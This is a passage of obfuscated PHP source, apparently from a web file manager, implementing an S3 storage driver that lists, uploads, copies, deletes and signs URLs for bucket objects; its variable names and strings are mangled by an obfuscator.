"\50{$­ÎÉè³}\x29{$øá´¤ßÃ}"; if (!in_array_not_case($ñ–úğøí, $áòšË‚ë)) { return $ñ–úğøí; } } return $ñ–úğøí; } public function listAllFiles($ó¢ôÚñ›, $“²ß±ıà) { $ÕÊë¥» =& $_SERVER[¼’ç§¼´]; if (empty($“²ß±ıà)) { return array(); } $¾ôÒÇ±Š = array_keys($“²ß±ıà); $÷ãÇßû = array(); $ó¢ôÚñ› = trim($ó¢ôÚñ›, $ÕÊë¥»[8]); foreach ($“²ß±ıà as $”³©¸ÊÚ => $á™ó¿ù¦) { $ƒ•ÈíÎÁ = ltrim(substr(trim($”³©¸ÊÚ, $ÕÊë¥»[8]), strlen($ó¢ôÚñ›)), $ÕÊë¥»[8]); if (substr($”³©¸ÊÚ, -1) == $ÕÊë¥»[8]) { $ƒ•ÈíÎÁ = rtrim($ƒ•ÈíÎÁ, $ÕÊë¥»[8]) . $ÕÊë¥»[8]; } $÷ãÇßû = array_merge($÷ãÇßû, $this->slicePath($ƒ•ÈíÎÁ)); } $…æÙúÑ• = array(); foreach (array_unique($÷ãÇßû) as $§ÕïÉòÈ) { $ñ©³„Ù = array($ÕÊë¥»[87] => $this->getPathOuter($ÕÊë¥»[8] . $ó¢ôÚñ› . $ÕÊë¥»[8] . $§ÕïÉòÈ), $ÕÊë¥»[78] => 1, $ÕÊë¥»[79] => 0); if (substr($§ÕïÉòÈ, -1) != $ÕÊë¥»[8]) { $ñ©³„Ù[$ÕÊë¥»[78]] = 0; $òÊëûíŠ = $this->getPath($ó¢ôÚñ› . $ÕÊë¥»[8] . $§ÕïÉòÈ); if (isset($“²ß±ıà[$òÊëûíŠ])) { $Êùµ·Òô = $“²ß±ıà[$òÊëûíŠ]; if (isset($Êùµ·Òô[$ÕÊë¥»[79]])) { $ñ©³„Ù[$ÕÊë¥»[79]] = intval($Êùµ·Òô[$ÕÊë¥»[79]]); } if (isset($Êùµ·Òô[$ÕÊë¥»[206]])) { $ñ©³„Ù[$ÕÊë¥»[88]] = intval($Êùµ·Òô[$ÕÊë¥»[206]]); } } } $…æÙúÑ•[] = $ñ©³„Ù; } return $…æÙúÑ•; } public function slicePath($Û±ı†÷Í) { $Áñæ¨€¿ =& $_SERVER[¼’ç§¼´]; $¡«‘œ•ç = explode($Áñæ¨€¿[8], trim($Û±ı†÷Í, $Áñæ¨€¿[8])); $şî‰òê = 0; do { ++$şî‰òê; $ò—”÷Á¹[] = implode($Áñæ¨€¿[8], array_slice($¡«‘œ•ç, 0, $şî‰òê)) . $Áñæ¨€¿[8]; } while ($şî‰òê < count($¡«‘œ•ç)); $ò—”÷Á¹[count($¡«‘œ•ç) - 1] = $Û±ı†÷Í; return $ò—”÷Á¹; } public function getHost() { $ı›åªÊ =& $_SERVER[¼’ç§¼´]; $‚ê½Ü¶Ç = parse_url(trim($this->domain, $ı›åªÊ[8])); $õÔ¹—ÁÏ = isset($‚ê½Ü¶Ç[$ı›åªÊ[207]]) ? $‚ê½Ü¶Ç[$ı›åªÊ[207]] : http_type(); $åÂÛè¢È = isset($‚ê½Ü¶Ç[$ı›åªÊ[208]]) ? $‚ê½Ü¶Ç[$ı›åªÊ[208]] : $‚ê½Ü¶Ç[$ı›åªÊ[87]]; if (isset($‚ê½Ü¶Ç[$ı›åªÊ[209]])) { $åÂÛè¢È .= $ı›åªÊ[4] . $‚ê½Ü¶Ç[$ı›åªÊ[209]]; } return $õÔ¹—ÁÏ . $ı›åªÊ[210] . $åÂÛè¢È; } public function pathEncode($ñÒëî®) { $ªºµïÅ =& $_SERVER[¼’ç§¼´]; return str_replace($ªºµïÅ[211], $ªºµïÅ[8], rawurlencode($ñÒëî®)); } public function writeLog($¡ÁØË‘á = '', $ƒŠŒıƒñ = false) { $Ë‚òê–Ë =& $_SERVER[¼’ç§¼´]; $Ñú»²á = in_array(ACTION, array($Ë‚òê–Ë[212], $Ë‚òê–Ë[213])); if (!$Ñú»²á && !GLOBAL_DEBUG) { return; } $¿Õ¸‚ìâ = $¡ÁØË‘á; static $€ÛÃì§º = null; if (!$€ÛÃì§º) { $€ÛÃì§º = strtoupper($this->getType()); } $¡ÁØË‘á = $€ÛÃì§º . $Ë‚òê–Ë[214] . $¡ÁØË‘á; if ($ƒŠŒıƒñ) { $ÂËöÙ•ê = error_get_last(); if ($ÂËöÙ•ê) { $¡ÁØË‘á = array($¡ÁØË‘á, $ÂËöÙ•ê); } } write_log($¡ÁØË‘á, $Ë‚òê–Ë[215]); if ($Ñú»²á) { throw new Exception($¿Õ¸‚ìâ); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($ôÌŞÅ´¸) { set_timeout(); require_once SDK_DIR . $_SERVER[¼’ç§¼´][216]; parent::__construct(); $this->_init($ôÌŞÅ´¸); } public function _init($­ÙÒ„á) { $Ë÷Ÿ Ë˜ =& $_SERVER[¼’ç§¼´]; $this->config = $­ÙÒ„á; foreach ($­ÙÒ„á as $™’æ­Şã => $•¨üœ–) { if (isset($this->{$™’æ­Şã})) { $this->{$™’æ­Şã} = $•¨üœ–; } } $this->endpoint = $­ÙÒ„á[$Ë÷Ÿ Ë˜[217]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $êŠş‹ğ– = $this->getHost(); if (!get_url_scheme($this->endpoint) && substr($êŠş‹ğ–, 0, 7) == $Ë÷Ÿ Ë˜[218]) { $êŠş‹ğ– = $Ë÷Ÿ Ë˜[219] . substr($êŠş‹ğ–, 7); } $this->client->setEndpoint($êŠş‹ğ–); if (in_array(ACTION, array($Ë÷Ÿ Ë˜[212], $Ë÷Ÿ Ë˜[213]))) { $this->client->setExceptions(); } } public function setSignVersion($¨®åÎ±ô = "\x76\x34") { $this->signVer = $¨®åÎ±ô; $this->client->setSignVersion($¨®åÎ±ô); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $üÉú­ùÄ) { return null; } } public function isBucketCors() { $ìÜú¥˜¬ =& $_SERVER[¼’ç§¼´]; $«û‚Úó¨ = $this->getBucketCors(); if (!$«û‚Úó¨ || !is_array($«û‚Úó¨)) { return !1; } if (!is_array($«û‚Úó¨[$ìÜú¥˜¬[220]])) { $«û‚Úó¨[$ìÜú¥˜¬[220]] = explode($ìÜú¥˜¬[50], $«û‚Úó¨[$ìÜú¥˜¬[220]]); } if ($«û‚Úó¨[$ìÜú¥˜¬[221]] != $ìÜú¥˜¬[222] || !in_array($ìÜú¥˜¬[222], $«û‚Úó¨[$ìÜú¥˜¬[220]])) { return !1; } $¡ßŞäæ = array_map($ìÜú¥˜¬[223], $«û‚Úó¨[$ìÜú¥˜¬[224]]); if (!is_array($¡ßŞäæ)) { $¡ßŞäæ = array(); } $¨§­¼á = array($ìÜú¥˜¬[225], $ìÜú¥˜¬[226], $ìÜú¥˜¬[227], $ìÜú¥˜¬[228], $ìÜú¥˜¬[229]); $˜³«µõ = array_diff($¨§­¼á, $¡ßŞäæ); return empty($˜³«µõ); } public function getBktRegion() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($Áƒé”úå, $º˜œ­´† = '', $şÈÇ•˜¨ = REPEAT_RENAME) { $™Õ¼ıÉä = $this->setContent($Áƒé”úå, $º˜œ­´†); if ($™Õ¼ıÉä !== !1) { return $this->getPathOuter($Áƒé”úå); } return !1; } public function mkdir($œë¨ê±ó, $¼†©Î‹ğ = REPEAT_SKIP) { $£èÈ¢Ù =& $_SERVER[¼’ç§¼´]; if (empty($œë¨ê±ó) && $œë¨ê±ó !== $£èÈ¢Ù[230]) { return !1; } if ($¼†©Î‹ğ && $this->_isFolder($œë¨ê±ó)) { return $this->getPathOuter($œë¨ê±ó); } $õ¥Â™ø = $this->setContent($œë¨ê±ó, $£èÈ¢Ù[12], !0); if ($õ¥Â™ø !== !1) { return $this->getPathOuter($œë¨ê±ó); } return !1; } public function copyFile($šœÑ’ëù, $ŠÇ‚š®, $›ƒ¤Ò£ƒ = array()) { $€–Úèµ‘ =& $_SERVER[¼’ç§¼´]; $¯‰£©¬˜ = $this->objectMeta($šœÑ’ëù); if (!$¯‰£©¬˜) { return !1; } if ($¯‰£©¬˜[$€–Úèµ‘[79]] <= 1024 * 1024 * 200) { $ğ¨•®’ = $this->client->copyObject($this->bucket, $šœÑ’ëù, $this->bucket, $ŠÇ‚š®, $€–Úèµ‘[231], $›ƒ¤Ò£ƒ); } else { $ğ¨•®’ = $this->client->multiCopyObject($this->bucket, $šœÑ’ëù, $this->bucket, $ŠÇ‚š®, $›ƒ¤Ò£ƒ); } $ğ¨•®’ = $ğ¨•®’ ? $this->getPathOuter($ŠÇ‚š®) : !1; return $ğ¨•®’; } public function moveFile($îŸ“¼îğ, $Şßğñ®) { if ($this->copyFile($îŸ“¼îğ, $Şßğñ®)) { $this->delFile($îŸ“¼îğ); return $this->getPathOuter($Şßğñ®); } return !1; } public function delFile($Ç£›ş¾ü) { return $this->client->deleteObject($this->bucket, $Ç£›ş¾ü); } public function delFolder($¸«Ã«·Œ) { $ŸÕ°ù×í =& $_SERVER[¼’ç§¼´]; if (!$this->exist($¸«Ã«·Œ)) { return !0; } $this->listItemCache = !1; $±±¿’™ = $this->fileList($¸«Ã«·Œ); $this->listItemCache = !0; $Êßßæ = trim($¸«Ã«·Œ, $ŸÕ°ù×í[8]) . $ŸÕ°ù×í[8]; if (!empty($¸«Ã«·Œ) && $¸«Ã«·Œ !== $ŸÕ°ù×í[230] && !in_array($Êßßæ, $±±¿’™[$ŸÕ°ù×í[85]])) { $±±¿’™[$ŸÕ°ù×í[85]][] = $Êßßæ; } $ñÜÉàë‘ = $this->delByBatch($±±¿’™[$ŸÕ°ù×í[86]]); if (!$ñÜÉàë‘) { return !1; } $ñÜÉàë‘ = $this->delByBatch($±±¿’™[$ŸÕ°ù×í[85]]); if (!$ñÜÉàë‘) { return !1; } return $this->delFile($Êßßæ); } private function delByBatch($òµÔñÍ†) { foreach (array_chunk($òµÔñÍ†, 1000) as $ÑÆÚßÊ») { $œ¦Æ«†Ô = $this->client->deleteObjects($this->bucket, $ÑÆÚßÊ»); if (!$œ¦Æ«†Ô) { return !1; } } return !0; } public function rename($Êù·Ş¶Ó, $ÛºŞ€´) { return $this->renameObject($Êù·Ş¶Ó, $ÛºŞ€´); } public function listPath($ÍŸí©¼¿, $øÛœÑ¿š = false) { $ŞÙæ–î =& $_SERVER[¼’ç§¼´]; $¢İË²îù = $this->fileList($ÍŸí©¼¿, $ŞÙæ–î[8], !0); foreach ($¢İË²îù[$ŞÙæ–î[85]] as $›Ù½À›Ê => $•œ¾¨‹¬) { $¢İË²îù[$ŞÙæ–î[85]][$›Ù½À›Ê] = $this->folderInfo($•œ¾¨‹¬, $øÛœÑ¿š, $•œ¾¨‹¬); } foreach ($¢İË²îù[$ŞÙæ–î[86]] as $›Ù½À›Ê => $•œ¾¨‹¬) { $¢İË²îù[$ŞÙæ–î[86]][$›Ù½À›Ê] = $this->fileInfo($•œ¾¨‹¬[$ŞÙæ–î[32]], $øÛœÑ¿š, $•œ¾¨‹¬); } return $¢İË²îù; } protected function infoChildren($åšÇ’Ù», &$àË—¯à) { $ĞÊÇúÅ… =& $_SERVER[¼’ç§¼´]; $³“ğµÑ = $this->fileList($åšÇ’Ù», $ĞÊÇúÅ…[12], !0); $àË—¯à[$ĞÊÇúÅ…[81]] += count($³“ğµÑ[$ĞÊÇúÅ…[85]]); $àË—¯à[$ĞÊÇúÅ…[80]] += count($³“ğµÑ[$ĞÊÇúÅ…[86]]); foreach ($³“ğµÑ[$ĞÊÇúÅ…[86]] as $éó”ßÜî) { if (!$éó”ßÜî || !$éó”ßÜî[$ĞÊÇúÅ…[79]]) { continue; } $àË—¯à[$ĞÊÇúÅ…[79]] += $éó”ßÜî[$ĞÊÇúÅ…[79]]; } } private function fileInfo($¾ıÚ¤çì, $üº÷Ô˜“ = false, $˜ıÙöüñ = array()) { $ä †¾çĞ =& $_SERVER[¼’ç§¼´]; $çÀãêÔä = array($ä †¾çĞ[32] => $this->pathThis($¾ıÚ¤çì), $ä †¾çĞ[87] => $this->getPathOuter($¾ıÚ¤çì), $ä †¾çĞ[33] => $ä †¾çĞ[232], $ä †¾çĞ[169] => $this->ext($¾ıÚ¤çì), $ä †¾çĞ[79] => isset($˜ıÙöüñ[$ä †¾çĞ[79]]) ? $˜ıÙöüñ[$ä †¾çĞ[79]] : 0); if ($üº÷Ô˜“) { return $çÀãêÔä; } $çÀãêÔä[$ä †¾çĞ[233]] = $çÀãêÔä[$ä †¾çĞ[88]] = 0; $çÀãêÔä[$ä †¾çĞ[234]] = $çÀãêÔä[$ä †¾çĞ[235]] = !0; if (empty($˜ıÙöüñ)) { $˜ıÙöüñ = $this->objectMeta($¾ıÚ¤çì); if (!$˜ıÙöüñ) { return $çÀãêÔä; } } if (isset($˜ıÙöüñ[$ä †¾çĞ[236]]) && $˜ıÙöüñ[$ä †¾çĞ[236]]) { $çÀãêÔä[$ä †¾çĞ[237]] = $˜ıÙöüñ[$ä †¾çĞ[236]]; } if (isset($˜ıÙöüñ[$ä †¾çĞ[206]])) { $çÀãêÔä[$ä †¾çĞ[88]] = $˜ıÙöüñ[$ä †¾çĞ[206]]; } if (isset($˜ıÙöüñ[$ä †¾çĞ[79]])) { $çÀãêÔä[$ä †¾çĞ[79]] = $˜ıÙöüñ[$ä †¾çĞ[79]]; } return $çÀãêÔä; } private function folderInfo($¹„‚‚…¥, $†¹¬¯¬Ô = false, $³“é“ìî = array()) { $ğ¹ºá¿º =& $_SERVER[¼’ç§¼´]; $şÎ²¿êõ = array($ğ¹ºá¿º[32] => $this->pathThis($¹„‚‚…¥), $ğ¹ºá¿º[87] => $this->getPathOuter($ğ¹ºá¿º[8] . $¹„‚‚…¥), $ğ¹ºá¿º[33] => $ğ¹ºá¿º[78]); if ($†¹¬¯¬Ô) { return $şÎ²¿êõ; } $şÎ²¿êõ[$ğ¹ºá¿º[233]] = $şÎ²¿êõ[$ğ¹ºá¿º[88]] = 0; $şÎ²¿êõ[$ğ¹ºá¿º[234]] = $şÎ²¿êõ[$ğ¹ºá¿º[235]] = !0; if ($¹„‚‚…¥ == $ğ¹ºá¿º[12]) { return $şÎ²¿êõ; } if (empty($³“é“ìî)) { $³“é“ìî = $this->objectMeta(trim($¹„‚‚…¥, $ğ¹ºá¿º[8]) . $ğ¹ºá¿º[8]); } if (isset($³“é“ìî[$ğ¹ºá¿º[206]])) { $şÎ²¿êõ[$ğ¹ºá¿º[233]] = $³“é“ìî[$ğ¹ºá¿º[206]]; } return $şÎ²¿êõ; } private function fileList($Ñ–Œâõ, $ë±§»± = '', $çˆş¦Ñ• = 0) { $Êµ™‚Á =& $_SERVER[¼’ç§¼´]; $¿éãÔòé = rtrim($Ñ–Œâõ, $Êµ™‚Á[8]) . $Êµ™‚Á[8]; $„µóÚ = $this->listObjs($¿éãÔòé, null, null, $ë±§»±); if (!$„µóÚ) { return array($Êµ™‚Á[85] => array(), $Êµ™‚Á[86] => array()); } $Á•Ğ¼«• = $¯íûá­ú = array(); foreach ($„µóÚ[$Êµ™‚Á[238]] as $ß—ÙÌĞÚ) { $í°Á¡³Û = $ß—ÙÌĞÚ[$Êµ™‚Á[32]]; if ($í°Á¡³Û == $¿éãÔòé) { continue; } $™ÏÁ„Ò = isset($ß—ÙÌĞÚ[$Êµ™‚Á[79]]) ? $ß—ÙÌĞÚ[$Êµ™‚Á[79]] : 0; $—Í€ç“• = $™ÏÁ„Ò == 0 && substr($í°Á¡³Û, strlen($í°Á¡³Û) - 1, 1) == $Êµ™‚Á[8] ? !0 : !1; $this->cacheMethodInfoSet($í°Á¡³Û, $—Í€ç“•, $ß—ÙÌĞÚ); if ($—Í€ç“•) { $Á•Ğ¼«•[] = $í°Á¡³Û; continue; } $¯íûá­ú[] = $çˆş¦Ñ• ? $ß—ÙÌĞÚ : $í°Á¡³Û; } foreach ($„µóÚ[$Êµ™‚Á[239]] as $ß—ÙÌĞÚ) { $Á•Ğ¼«•[] = $ß—ÙÌĞÚ[$Êµ™‚Á[32]]; $this->cacheMethodInfoSet($ß—ÙÌĞÚ[$Êµ™‚Á[32]], !0); } $this->cacheMethodInfoSet($Ñ–Œâõ, !0); return array($Êµ™‚Á[85] => $Á•Ğ¼«•, $Êµ™‚Á[86] => $¯íûá­ú); } private function listObjs($ëÑéÌ½–, $ä¨Ÿ«±× = null, $Œªø¶® = null, $ŒÈÃ†Ëä = null) { $°­ìì€™ =& $_SERVER[¼’ç§¼´]; $ëÑéÌ½– = trim($ëÑéÌ½–, $°­ìì€™[8]); $ÏŠçëŸË = empty($ëÑéÌ½–) && $ëÑéÌ½– !== $°­ìì€™[230] ? $°­ìì€™[12] : $ëÑéÌ½– . $°­ìì€™[8]; return $this->client->getBucket($this->bucket, $ÏŠçëŸË, $ä¨Ÿ«±×, $Œªø¶®, $ŒÈÃ†Ëä, !0); } public function has($ëŞîæ¦ˆ, $¾‡ªÙ• = false, $Ñ¾‹ø = true) { $†è‚˜ˆ =& $_SERVER[¼’ç§¼´]; $ëŞîæ¦ˆ = trim($ëŞîæ¦ˆ, $†è‚˜ˆ[8]); $Æı¾ÕŸÊ = empty($ëŞîæ¦ˆ) && $ëŞîæ¦ˆ !== $†è‚˜ˆ[230] ? $†è‚˜ˆ[12] : $ëŞîæ¦ˆ . $†è‚˜ˆ[8]; $­ëºúá = null; $˜¤ìÔ¼ë = 500; $èŸøÃâ = $†è‚˜ˆ[8]; $ÃÉµ†Á = $Œ¬¥˜ä™ = array(); while (!0) { $à„÷‰‡¢ = $this->listObjs($ëŞîæ¦ˆ, $­ëºúá, $˜¤ìÔ¼ë, $èŸøÃâ); if (!$à„÷‰‡¢) { break; } $­ëºúá = $à„÷‰‡¢[$†è‚˜ˆ[240]]; $Ÿı–ü»¶ = $à„÷‰‡¢[$†è‚˜ˆ[238]]; $¿½††¡Æ = $à„÷‰‡¢[$†è‚˜ˆ[239]]; if (empty($Ÿı–ü»¶) && empty($¿½††¡Æ)) { break; } if (count($Ÿı–ü»¶) == 1 && $Ÿı–ü»¶[0][$†è‚˜ˆ[32]] == $Æı¾ÕŸÊ) { break; } if ($¾‡ªÙ•) { if (count($Ÿı–ü»¶)) { $Ÿı–ü»¶ = array_column($Ÿı–ü»¶, $†è‚˜ˆ[32]); $ÃÉµ†Á = array_merge($ÃÉµ†Á, $Ÿı–ü»¶); } if (count($¿½††¡Æ)) { $¿½††¡Æ = array_column($¿½††¡Æ, $†è‚˜ˆ[32]); $Œ¬¥˜ä™ = array_merge($Œ¬¥˜ä™, $¿½††¡Æ); } if ($­ëºúá === null) { break; } continue; } if ($Ñ¾‹ø) { if (!empty($Ÿı–ü»¶)) { if (count($Ÿı–ü»¶) > 1 || isset($Ÿı–ü»¶[0][$†è‚˜ˆ[32]]) && $Ÿı–ü»¶[0][$†è‚˜ˆ[32]] != $Æı¾ÕŸÊ) { return !0; } } } else { if (!empty($¿½††¡Æ)) { return !0; } } if ($­ëºúá === null) { break; } } if ($¾‡ªÙ•) { $ÃÉµ†Á = array_diff($ÃÉµ†Á, array($Æı¾ÕŸÊ)); $ÃÉµ†Á = count(array_unique($ÃÉµ†Á)); $Œ¬¥˜ä™ = count(array_unique($Œ¬¥˜ä™)); return array($†è‚˜ˆ[241] => $ÃÉµ†Á, $†è‚˜ˆ[242] => $Œ¬¥˜ä™); } return !1; } public function listAll($‡èßôû) { $à€ù¹ÁÉ =& $_SERVER[¼’ç§¼´]; $½ì€ÖÂî = $this->fileList($‡èßôû, $à€ù¹ÁÉ[12], !0); $ÀÔó—¼ğ = array_to_keyvalue($½ì€ÖÂî[$à€ù¹ÁÉ[86]], $à€ù¹ÁÉ[32]); foreach ($½ì€ÖÂî[$à€ù¹ÁÉ[85]] as $‡Ûİò¸º) { if (is_string($‡Ûİò¸º)) { $ÀÔó—¼ğ[$‡Ûİò¸º] = array($à€ù¹ÁÉ[79] => 0); } } return $this->listAllFiles($‡èßôû, $ÀÔó—¼ğ); } public function canRead($ßê•—ß£) { $èå£¨ ˆ =& $_SERVER[¼’ç§¼´]; $ÄæáåßÓ = $this->client->getAccessControlPolicy($this->bucket, $ßê•—ß£); if (!$ÄæáåßÓ) { return !1; } return in_array($ÄæáåßÓ, array($èå£¨ ˆ[243], $èå£¨ ˆ[244], $èå£¨ ˆ[245])) ? !0 : !1; } public function canWrite($ÎÂ’ÒË) { $ĞÖ¿âĞĞ =& $_SERVER[¼’ç§¼´]; $û™ËùÔ½ = $this->client->getAccessControlPolicy($this->bucket, $ÎÂ’ÒË); if (!$û™ËùÔ½) { return !1; } return in_array($û™ËùÔ½, array($ĞÖ¿âĞĞ[243], $ĞÖ¿âĞĞ[244])) ? !0 : !1; } public function getContent($ÏëôÆ¾Î) { return $this->client->getObject($this->bucket, $ÏëôÆ¾Î); } public function setContent($×³£Ğ·, $š±¬±äş = '', $¹ûÇ×” = false) { $‹ÀƒŞ =& $_SERVER[¼’ç§¼´]; $×³£Ğ· = $¹ûÇ×” ? trim($×³£Ğ·, $‹ÀƒŞ[8]) . $‹ÀƒŞ[8] : $×³£Ğ·; $›òÖûºÙ = get_file_mime(get_path_ext($×³£Ğ·)); $²©´¥ˆñ = $this->client->putObject($š±¬±äş, $this->bucket, $×³£Ğ·, $‹ÀƒŞ[231], array(), $›òÖûºÙ); if (!$²©´¥ˆñ) { return !1; } if ($¹ûÇ×”) { return !0; } return $²©´¥ˆñ ? !0 : !1; } public function fileSubstr($õÖ€Úõ™, $öçüŠÕÄ, $ß—İ¼ûŞ) { $ÌĞ®œæâ = $öçüŠÕÄ + $ß—İ¼ûŞ - 1; return $this->client->getObject($this->bucket, $õÖ€Úõ™, array($_SERVER[¼’ç§¼´][246] => "\x62\x79\164\x65\x73\x3d{$öçüŠÕÄ}\55{$ÌĞ®œæâ}")); } public function upload($’Ş–ßç®, $ê¢æÌÂ, $Óôé‹ = false, $üõº‹Âû = REPEAT_REPLACE) { $î‘ŒñÑ =& $_SERVER[¼’ç§¼´]; $¾õ€îùé = array($î‘ŒñÑ[247] => @md5_file($ê¢æÌÂ)); $Ô£çë”‹ = array($î‘ŒñÑ[248] => get_file_mime(get_path_ext($’Ş–ßç®))); if (IO::size($ê¢æÌÂ) <= 1024 * 1024 * 200) { $ÊºÊü©“ = $this->client->putObjectFile($ê¢æÌÂ, $this->bucket, $’Ş–ßç®, $î‘ŒñÑ[231], $¾õ€îùé, $Ô£çë”‹); return !empty($ÊºÊü©“) ? $this->getPathOuter($’Ş–ßç®) : !1; } $®Òí™õ… = $this->client->multiUploadObject($ê¢æÌÂ, $this->bucket, trim($’Ş–ßç®, $î‘ŒñÑ[8]), $¾õ€îùé, $Ô£çë”‹); return $®Òí™õ… ? $this->getPathOuter($’Ş–ßç®) : !1; } public function download($¬˜Ÿ¾¯è, $Ğ£‘ä ƒ) { if (!@is_dir($this->pathFather($Ğ£‘ä ƒ)) && !IO::mkdir($this->pathFather($Ğ£‘ä ƒ))) { return !1; } $şêí’¤Ì = $this->client->getObject($this->bucket, $¬˜Ÿ¾¯è, array(), $Ğ£‘ä ƒ); return $şêí’¤Ì !== !1 ? $Ğ£‘ä ƒ : !1; } public function link($º¨©ó–©, $İÑÁêˆ¥ = array()) { return $this->getPreSignedURL($º¨©ó–©, 3600 * 12, $İÑÁêˆ¥); } private function getPreSignedURL($”†Íâ†Ì, $¢•È„ä, $ôÊÍÕÒ– = array(), $»ÆÚéƒ« = "\107\105\124") { $Ô—±Ÿ … =& $_SERVER[¼’ç§¼´]; $”†Íâ†Ì = trim($”†Íâ†Ì, $Ô—±Ÿ …[8]); if ($this->signVer == $Ô—±Ÿ …[249]) { return $this->client->getPreSignedV2URL($this->bucket, $”†Íâ†Ì, $¢•È„ä, $»ÆÚéƒ«, $ôÊÍÕÒ–); } return $this->client->getPreSignedV4URL($this->bucket, $”†Íâ†Ì, $¢•È„ä, array(), $»ÆÚéƒ«, $ôÊÍÕÒ–); } public function fileOut($ÓÈû¹Ù–, $çş›Ú­¸ = false, $“ÀœÒŸê = false, $ŠÔ¼ß—ş = '') { $„É…óûÛ =& $_SERVER[¼’ç§¼´]; if ($this->isFileOutServer()) { return $this->fileOutServer($ÓÈû¹Ù–, $çş›Ú­¸, $“ÀœÒŸê, $ŠÔ¼ß—ş); } if (!$“ÀœÒŸê) { $“ÀœÒŸê = $this->pathThis($ÓÈû¹Ù–); } $™°ÕÅºà = get_file_mime(get_path_ext($“ÀœÒŸê)); if ($™°ÕÅºà == $„É…óûÛ[250]) { return parent::fileOut($ÓÈû¹Ù–, $çş›Ú­¸, $“ÀœÒŸê, $ŠÔ¼ß—ş); } $¶™Ï½ıü = array($„É…óûÛ[251] => $™°ÕÅºà); if ($çş›Ú­¸) { $¶™Ï½ıü[$„É…óûÛ[252]] = $„É…óûÛ[253] . rawurlencode($“ÀœÒŸê); } else { } $¤Ì»ÂÂ = $this->link($ÓÈû¹Ù–, $¶™Ï½ıü); $this->fileOutLink($¤Ì»ÂÂ); } public function fileOutServer($Ïµ‚€¶Œ, $ÛĞÈ”¿¼ = false, $†”­Àú× = false, $”ˆÒ Éú = '') { parent::fileOut($Ïµ‚€¶Œ, $ÛĞÈ”¿¼, $†”­Àú×, $”ˆÒ Éú); } public function fileOutImageServer($†÷ñ¾äæ, $‚óïÛÙƒ = 250) { parent::fileOutImage($†÷ñ¾äæ, $‚óïÛÙƒ); } public function hashMd5($ŸüÚÏê, $³ù™±ÄÉ = '') { $ú ƒ„Š = $this->objectMeta($ŸüÚÏê); if (!$ú ƒ„Š) { return !1; } $³ù™±ÄÉ = $³ù™±ÄÉ ? $³ù™±ÄÉ : _get($ú ƒ„Š, $_SERVER[¼’ç§¼´][254]); return $³ù™±ÄÉ; } public function uploadFormData($µØñÇñğ, $Ñ‚Îôé = 3600) { $Íà•¾›ï =& $_SERVER[¼’ç§¼´]; if (!$this->_isClientAsync()) { $ çÇä¹è = $this->getPreSignedURL($µØñÇñğ, $Ñ‚Îôé, array(), $Íà•¾›ï[255]); return array($Íà•¾›ï[208] => str_replace($Íà•¾›ï[218], $Íà•¾›ï[256], $ çÇä¹è)); } if (isset($GLOBALS[$Íà•¾›ï[6]][$Íà•¾›ï[92]][$Íà•¾›ï[257]]) && $GLOBALS[$Íà•¾›ï[6]][$Íà•¾›ï[92]][$Íà•¾›ï[257]] == $Íà•¾›ï[230]) { return $this->uploadMultiData($µØñÇñğ, $Ñ‚Îôé); } if ($this->signVer == $Íà•¾›ï[249]) { return $this->uploadFormDataV2($µØñÇñğ, $Ñ‚Îôé); } return $this->uploadFormDataV4($µØñÇñğ, $Ñ‚Îôé); } public function uploadFormDataV2($Æ¼ƒ½¿¾, $Öä¾î¯è = 3600) { $òæÙÌ =& $_SERVER[¼’ç§¼´]; $ö¹‡¢¸ô = $this->pathFather($Æ¼ƒ½¿¾); $í®ÔæÒ¡ = $this->client->getHttpUploadPostParams($this->bucket, $ö¹‡¢¸ô, $òæÙÌ[231], $Öä¾î¯è); $öµÉ®º = array_merge((array) $í®ÔæÒ¡, array($òæÙÌ[258] => $òæÙÌ[249], $òæÙÌ[208] => $this->getHost())); if ($this->_isClientAsync()) { unset($öµÉ®º[$òæÙÌ[258]]); } return $öµÉ®º; } public function uploadFormDataV4($šÇ–˜¢Õ, $•ëå¿“ = 3600) { $¹èÆŠñá =& $_SERVER[¼’ç§¼´]; $ñÈ±ÖÓ = $¹èÆŠñá[231]; $µâÕ¬ş = $¹èÆŠñá[259]; $äù¥³˜Ï = $¹èÆŠñá[62]; $¿Šîø•‰ = gmdate($¹èÆŠñá[260]); $‚¡¬ˆ = gmdate($¹èÆŠñá[261]); $¾·³õ€¿ = $¹èÆŠñá[262]; $ˆµ®Ì£¸ = $•ëå¿“ . $¹èÆŠñá[12]; $Î ·Ã¡© = $¹èÆŠñá[263]; $ÃòÂ–‰ = array($this->accessKey, $‚¡¬ˆ, $this->region, $äù¥³˜Ï, $¾·³õ€¿); $øÚ÷Ë÷ = implode($¹èÆŠñá[8], $ÃòÂ–‰); $À “®°– = array($¹èÆŠñá[264] => gmdate($¹èÆŠñá[265], strtotime($¹èÆŠñá[266])), $¹èÆŠñá[267] => array(array($¹èÆŠñá[268] => $this->bucket), array($¹èÆŠñá[269], $¹èÆŠñá[270], $¹èÆŠñá[12]), array($¹èÆŠñá[269], $¹èÆŠñá[271], $¹èÆŠñá[12]), array($¹èÆŠñá[272] => $Î ·Ã¡©), array($¹èÆŠñá[273] => $øÚ÷Ë÷), array($¹èÆŠñá[274] => $µâÕ¬ş), array($¹èÆŠñá[275] => $¿Šîø•‰), array($¹èÆŠñá[276] => $ˆµ®Ì£¸))); $æÍ­ÁÊº = base64_encode(json_encode($À “®°–)); $Ä‰ò·Òı = hash_hmac($¹èÆŠñá[277], $‚¡¬ˆ, $¹èÆŠñá[278] . $this->secret, !0); $ô¹¢üÈ = hash_hmac($¹èÆŠñá[277], $this->region, $Ä‰ò·Òı, !0); $åƒåôŞô = hash_hmac($¹èÆŠñá[277], $äù¥³˜Ï, $ô¹¢üÈ, !0); $ÜŞá¥±‹ = hash_hmac($¹èÆŠñá[277], $¾·³õ€¿, $åƒåôŞô, !0); $ÇÉ“Û¤¼ = hash_hmac($¹èÆŠñá[277], $æÍ­ÁÊº, $ÜŞá¥±‹); $•í¬¥Ğ = array($¹èÆŠñá[248] => $¹èÆŠñá[12], $¹èÆŠñá[272] => 